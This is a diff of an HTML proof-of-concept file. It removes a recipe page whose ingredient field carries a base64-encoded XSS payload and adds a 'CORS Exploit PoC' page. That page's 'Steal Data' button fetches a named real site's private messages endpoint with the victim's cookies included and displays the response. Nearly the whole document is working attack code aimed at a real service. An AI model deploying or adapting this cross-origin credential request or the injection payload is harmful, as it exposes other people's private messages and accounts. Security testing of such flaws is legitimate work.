@@ -1,30 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Malicious Recipe PoC</title>
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org/",
-    "@type": "Recipe",
-    "name": "Quick Pizza",
-    "description": "Proof-of-concept recipe with inline payload",
-    "recipeIngredient": [
-      "1 cup flour",
-      "1/2 cup water",
-      "1 tsp yeast",
-      "1/2 cup tomato sauce",
-      "<img src='data:image/svg+xml;base64,PHN2ZyBvbmVycm9yPSJhbGVydCgnWFNTJykiPjwvc3ZnPg=='>"
-    ],
-    "recipeInstructions": [
-      "Mix ingredients",
-      "Bake at 200C"
-    ]
-  }
-  </script>
-</head>
+<html>
 <body>
-  <h1>Malicious Recipe PoC</h1>
-  <p>This page is designed for testing DOM injection via recipe fields.</p>
+  <h2>CORS Exploit PoC</h2>
+  <button onclick="attack()">Steal Data</button>
+  <pre id="output"></pre>
+
+  <script>
+    async function attack() {
+      try {
+        const res = await fetch("https://www.myfitnesspal.com/messages/new", {
+          method: "GET",
+          credentials: "include" // VERY important: send victim's cookies
+        });
+
+        const text = await res.text();
+        document.getElementById("output").innerText = text;
+      } catch (err) {
+        document.getElementById("output").innerText = "Error: " + err;
+      }
+    }
+  </script>
 </body>
 </html>
+
